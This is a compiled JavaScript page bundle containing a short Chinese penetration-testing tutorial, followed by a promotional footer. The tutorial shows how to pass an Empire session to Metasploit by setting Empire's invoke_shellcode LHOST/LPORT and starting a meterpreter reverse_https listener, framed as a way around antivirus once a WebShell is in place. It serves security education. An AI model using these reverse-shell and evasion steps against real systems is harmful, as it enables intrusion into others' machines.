(window.webpackJsonp=window.webpackJsonp||[]).push([[346],{642:function(s,t,a){"use strict";a.r(t);var e=a(7),l=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"empire-反弹回-metasploit"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#empire-反弹回-metasploit"}},[s._v("#")]),s._v(" Empire 反弹回 Metasploit")]),s._v(" "),t("p",[s._v("在实际渗透中，当拿到WebShell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用PowerShell来绕过，也可以执行Empire的Payload来绕过，成功之后再使用Empiore的模块将其反弹回Metasploit。 这里使用Empire的usemodule code_execution/invoke_shellcode模块修改两个参数：Lhost、Lport。将Lhost修改为MSF所在主机的IP，按以下命令设置：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("set Lhost 192.168.31.247\nset Lport 4444\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010920450179.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("在MSF上设置监听，命令如下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("use exploit/multi/handler\nset payload windows/meterpreter/reverse_https\nset lhost 192.168.31.247\nset lport 4444\nrun\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("运行后，就可以收到Empire反弹回来的Shell")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190109204848442.jpg",loading:"lazy"}})]),s._v(" "),t("h1",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=l.exports}}]);